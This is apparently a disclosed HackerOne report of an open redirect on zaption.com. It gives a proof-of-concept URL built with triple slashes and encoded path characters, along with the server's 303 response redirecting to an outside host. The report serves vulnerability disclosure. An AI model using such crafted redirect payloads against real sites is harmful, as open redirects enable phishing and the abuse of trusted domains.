# [zaption.com] Open Redirect

## Report Details
- **Report ID**: 45516
- **URL**: https://hackerone.com/reports/45516
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-01-28T11:15:52.409Z
- **Disclosed**: 2016-10-29T16:09:35.995Z

## Reporter
- **Username**: bobrov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zaption

## Vulnerability Information
PoC:
http://zaption.com///www.google.com/%2f%2e%2e

HTTP Response:
> HTTP/1.1 303 See Other
> Access-Control-Allow-Origin: *
> Content-Type: text/html; charset=utf-8
> Date: Wed, 28 Jan 2015 11:10:52 GMT
> Location: //www.google.com/%2f%2e%2e/

## Attachments
No attachments
